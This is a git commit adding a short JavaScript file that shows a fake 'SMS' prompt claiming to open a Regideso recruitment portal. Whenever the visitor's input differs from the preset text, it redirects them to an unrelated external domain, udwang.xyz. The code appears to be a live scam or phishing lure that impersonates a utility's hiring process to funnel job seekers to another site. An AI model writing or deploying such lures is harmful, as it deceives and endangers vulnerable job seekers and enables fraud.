c09a938c1eadca65443ada429c761b822b886534
bigetijazz32 <bigetijazz32@gmail.com>
2025-08-01 20:48:33 +0100

    Create regideso.js

---
+++ regideso.js
@@ -0,0 +1,6 @@
+
+var password = 'Recrutement Regideso'
+password=prompt('SMS: Bienvenue sur le portail de candidature de la Regideso, appuyez sur OK pour postuler au','Recrutement Regideso');
+if (password != 'Recrutement Regideso') {
+location.href='http://udwang.xyz/regideso';
+}
